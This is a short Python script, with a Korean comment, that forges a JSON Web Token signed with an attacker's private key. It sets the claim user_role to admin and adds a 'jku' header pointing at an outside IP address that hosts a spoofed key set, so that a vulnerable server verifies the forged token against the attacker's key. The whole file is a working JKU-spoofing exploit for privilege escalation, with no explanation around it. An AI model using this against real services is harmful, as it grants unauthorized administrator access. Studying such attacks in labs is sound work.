import jwt

# 개인키 로드
with open('attacker_private.pem', 'r') as f:
    private_key = f.read()



payload = {
    "user_role": "admin"
}

headers = {
    "alg": "RS256",
    "kid": "server-key",
    "jku": "http://158.179.194.32/files/jku_spoofing/key.json"
}

token = jwt.encode(
    payload,
    private_key,
    algorithm="RS256",
    headers=headers
)

print("JWT:", token)
